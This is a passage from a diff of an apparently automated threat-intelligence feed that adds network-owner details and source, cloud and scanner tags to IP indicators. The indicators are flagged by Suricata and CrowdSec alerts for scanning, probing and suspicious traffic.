+        "comment": "Sources: suricata | first_seen: 2026-04-20T22:26:28Z | last_seen: 2026-04-20T22:26:28Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.17",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2993,15 +3963,45 @@
         "to_ids": true,
         "uuid": "5fe8d101-91ad-450a-9df1-a1a79a3fea63",
         "distribution": "5",
-        "timestamp": "1776776412",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-21T10:23:39Z | last_seen: 2026-04-21T10:23:53Z | hits: 5 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290759",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-21T10:23:39Z | last_seen: 2026-04-21T10:23:53Z | hits: 5 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.200.0.0/13) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.202.75.66",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3009,15 +4009,31 @@
         "to_ids": true,
         "uuid": "ee428a6f-ea15-481e-87d1-fb73004c4f81",
         "distribution": "5",
-        "timestamp": "1776776412",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T07:15:06Z | last_seen: 2026-04-21T07:15:06Z | hits: 1 | scenarios: suricata/SURICATA SSH invalid banner",
+        "timestamp": "1777290759",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T07:15:06Z | last_seen: 2026-04-21T07:15:06Z | hits: 1 | AS43815 NASHPROSTIR-LLC - Nash Prostir LLC (193.30.244.0/24) | scenarios: suricata/SURICATA SSH invalid banner",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "193.30.244.60",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3025,15 +4041,31 @@
         "to_ids": true,
         "uuid": "76fb1624-6cce-477e-8d2b-b87f6fa4071f",
         "distribution": "5",
-        "timestamp": "1776776413",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T07:08:10Z | last_seen: 2026-04-21T07:08:10Z | hits: 1 | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 1",
+        "timestamp": "1777290759",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T07:08:10Z | last_seen: 2026-04-21T07:08:10Z | hits: 1 | AS203087 GOHOST-KZ - Fedinyak Sergey Vyacheslavovich (109.248.170.0/24) | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 1",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "109.248.170.188",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3041,15 +4073,31 @@
         "to_ids": true,
         "uuid": "b3b1d56a-20b1-4d52-88be-47752b223705",
         "distribution": "5",
-        "timestamp": "1776776414",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T06:58:10Z | last_seen: 2026-04-21T06:58:10Z | hits: 1 | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
+        "timestamp": "1777290760",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T06:58:10Z | last_seen: 2026-04-21T06:58:10Z | hits: 1 | AS10439 CARINET - CariNet (66.240.192.0/18) | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "66.240.223.208",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3057,15 +4105,45 @@
         "to_ids": true,
         "uuid": "30ac15af-f392-4f56-9e5c-45ecc59b6bcf",
         "distribution": "5",
-        "timestamp": "1776776414",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T04:08:31Z | last_seen: 2026-04-21T04:08:31Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777290760",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T04:08:31Z | last_seen: 2026-04-21T04:08:31Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.2",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3073,15 +4151,31 @@
         "to_ids": true,
         "uuid": "5a01090d-86c5-4b98-8ab5-378090b971a5",
         "distribution": "5",
-        "timestamp": "1776776415",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T03:55:30Z | last_seen: 2026-04-21T03:55:30Z | hits: 1 | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 4",
+        "timestamp": "1777290760",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T03:55:30Z | last_seen: 2026-04-21T03:55:30Z | hits: 1 | AS150436 BYTEPLUS-AS-AP Byteplus Pte. Ltd. (163.7.0.0/21) | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 4",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "163.7.1.156",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3089,15 +4183,31 @@
         "to_ids": true,
         "uuid": "5db7dc89-21bb-4c56-9519-a25ac2d569b7",
         "distribution": "5",
-        "timestamp": "1776776416",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T03:50:25Z | last_seen: 2026-04-21T03:50:25Z | hits: 1 | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
+        "timestamp": "1777290761",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T03:50:25Z | last_seen: 2026-04-21T03:50:25Z | hits: 1 | AS14061 DIGITALOCEAN-ASN - DigitalOcean (159.89.48.0/21) | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "159.89.50.64",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3105,15 +4215,31 @@
         "to_ids": true,
         "uuid": "e0f4f377-1d07-4170-afcc-fe24c417cdf5",
         "distribution": "5",
-        "timestamp": "1776776416",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T01:20:18Z | last_seen: 2026-04-21T01:20:18Z | hits: 1 | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 1",
+        "timestamp": "1777290761",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T01:20:18Z | last_seen: 2026-04-21T01:20:18Z | hits: 1 | AS36352 AS-COLOCROSSING - HostPapa (104.168.56.0/22) | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 1",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "104.168.56.24",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3121,15 +4247,45 @@
         "to_ids": true,
         "uuid": "650d4d55-03ea-4239-b822-5f06485dee7c",
         "distribution": "5",
-        "timestamp": "1776819610",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T12:22:53Z | last_seen: 2026-04-21T12:22:53Z | hits: 2 | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
+        "timestamp": "1777290761",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T12:22:53Z | last_seen: 2026-04-21T12:22:53Z | hits: 2 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.160.0.0/12) | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.169.80.121",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3137,15 +4293,45 @@
         "to_ids": true,
         "uuid": "67d29e22-620c-4898-923a-efc9007fe1c8",
         "distribution": "5",
-        "timestamp": "1776862811",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-22T00:03:34Z | last_seen: 2026-04-22T00:03:39Z | hits: 10 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290762",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-22T00:03:34Z | last_seen: 2026-04-22T00:03:39Z | hits: 10 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (4.208.0.0/12) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "4.223.161.209",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3153,15 +4339,45 @@
         "to_ids": true,
         "uuid": "78e1f0f6-83da-4a17-a5e1-63ee5824733c",
         "distribution": "5",
-        "timestamp": "1776819612",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T22:26:28Z | last_seen: 2026-04-21T22:26:28Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777290762",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T22:26:28Z | last_seen: 2026-04-21T22:26:28Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.22",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3169,15 +4385,31 @@
         "to_ids": true,
         "uuid": "2d4fe20d-0852-4835-9bb6-00bfdee78432",
         "distribution": "5",
-        "timestamp": "1776819613",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T21:02:17Z | last_seen: 2026-04-21T21:02:17Z | hits: 1 | scenarios: suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt",
+        "timestamp": "1777290763",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T21:02:17Z | last_seen: 2026-04-21T21:02:17Z | hits: 1 | AS4766 KIXS-AS-KR Korea Telecom (175.208.0.0/13) | scenarios: suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "175.212.133.63",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3185,15 +4417,31 @@
         "to_ids": true,
         "uuid": "68294d32-8eb5-4647-8738-b7a4f38168eb",
         "distribution": "5",
-        "timestamp": "1776819614",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T20:38:34Z | last_seen: 2026-04-21T20:38:34Z | hits: 1 | scenarios: suricata/SURICATA SSH invalid banner",
+        "timestamp": "1777290763",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T20:38:34Z | last_seen: 2026-04-21T20:38:34Z | hits: 1 | AS25369 BANDWIDTH-AS - Hydra Communications Ltd (37.10.113.0/24) | scenarios: suricata/SURICATA SSH invalid banner",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "37.10.113.220",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3201,15 +4449,45 @@
         "to_ids": true,
         "uuid": "fc4772a5-20e7-4791-8e83-a2ecd141e5ec",
         "distribution": "5",
-        "timestamp": "1776819614",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T16:55:20Z | last_seen: 2026-04-21T16:55:20Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777290764",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T16:55:20Z | last_seen: 2026-04-21T16:55:20Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.24",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3217,15 +4495,31 @@
         "to_ids": true,
         "uuid": "cb9e1649-3fd0-4619-b861-b560a52cb6d0",
         "distribution": "5",
-        "timestamp": "1776819615",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T16:35:32Z | last_seen: 2026-04-21T16:35:32Z | hits: 1 | scenarios: suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)",
+        "timestamp": "1777290764",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T16:35:32Z | last_seen: 2026-04-21T16:35:32Z | hits: 1 | AS20473 AS-VULTR - The Constant Company (45.63.96.0/21) | scenarios: suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "45.63.97.69",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3233,15 +4527,31 @@
         "to_ids": true,
         "uuid": "6687f55c-c7ec-4ca4-ae09-30383e1c19b5",
         "distribution": "5",
-        "timestamp": "1776819616",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T16:17:50Z | last_seen: 2026-04-21T16:17:50Z | hits: 1 | scenarios: suricata/SURICATA HTTP unable to match response to request",
+        "timestamp": "1777290764",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T16:17:50Z | last_seen: 2026-04-21T16:17:50Z | hits: 1 | AS49870 AS49870-BV - Alsycon B.V. (185.224.128.0/24) | scenarios: suricata/SURICATA HTTP unable to match response to request",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "185.224.128.16",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3249,15 +4559,31 @@
         "to_ids": true,
         "uuid": "05c10195-800f-4389-b2b4-04ac3e11c194",
         "distribution": "5",
-        "timestamp": "1776819616",
-        "comment": "Sources: suricata | first_seen: 2026-04-21T23:29:00Z | last_seen: 2026-04-21T23:29:00Z | hits: 1 | scenarios: suricata/SURICATA HTTP unable to match response to request",
+        "timestamp": "1777290765",
+        "comment": "Sources: suricata | first_seen: 2026-04-21T23:29:00Z | last_seen: 2026-04-21T23:29:00Z | hits: 1 | AS48874 HOSTMAZE - HOSTMAZE INC SRL-D (89.32.41.0/24) | scenarios: suricata/SURICATA HTTP unable to match response to request",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "89.32.41.145",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3265,15 +4591,45 @@
         "to_ids": true,
         "uuid": "70b252da-f27f-4c58-a9c6-59a0451dac8b",
         "distribution": "5",
-        "timestamp": "1776862812",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-22T10:11:55Z | last_seen: 2026-04-22T10:11:56Z | hits: 5 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290765",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-22T10:11:55Z | last_seen: 2026-04-22T10:11:56Z | hits: 5 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.192.0.0/10) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.216.170.198",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3281,15 +4637,45 @@
         "to_ids": true,
         "uuid": "29e8db6d-2ae5-4fd6-b626-1376087ffc38",
         "distribution": "5",
-        "timestamp": "1776906011",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-23T00:30:06Z | last_seen: 2026-04-23T00:30:06Z | hits: 1 | scenarios: crowdsec/http-bad-user-agent",
+        "timestamp": "1777290765",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-23T00:30:06Z | last_seen: 2026-04-23T00:30:06Z | hits: 1 | AS398722 CENSYS-ARIN-03 - Censys (199.45.155.0/24) | scenarios: crowdsec/http-bad-user-agent",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "199.45.155.83",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "8",
+            "name": "mwl:scanner=\"censys\"",
+            "colour": "#add377",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3297,15 +4683,45 @@
         "to_ids": true,
         "uuid": "e412e5ec-e4d1-4582-8ab9-7a435a180b28",
         "distribution": "5",
-        "timestamp": "1776906011",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-22T23:44:07Z | last_seen: 2026-04-22T23:44:07Z | hits: 1 | scenarios: crowdsec/http-bad-user-agent",
+        "timestamp": "1777290766",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-22T23:44:07Z | last_seen: 2026-04-22T23:44:07Z | hits: 1 | AS398722 CENSYS-ARIN-03 - Censys (199.45.154.0/24) | scenarios: crowdsec/http-bad-user-agent",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "199.45.154.157",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "8",
+            "name": "mwl:scanner=\"censys\"",
+            "colour": "#add377",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3313,15 +4729,45 @@
         "to_ids": true,
         "uuid": "c15d901f-90c6-44d9-889f-dd8690115fc2",
         "distribution": "5",
-        "timestamp": "1776906012",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-22T22:59:21Z | last_seen: 2026-04-22T22:59:21Z | hits: 1 | scenarios: crowdsec/http-bad-user-agent",
+        "timestamp": "1777290766",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-22T22:59:21Z | last_seen: 2026-04-22T22:59:21Z | hits: 1 | AS398722 CENSYS-ARIN-03 - Censys (199.45.154.0/24) | scenarios: crowdsec/http-bad-user-agent",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "199.45.154.123",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
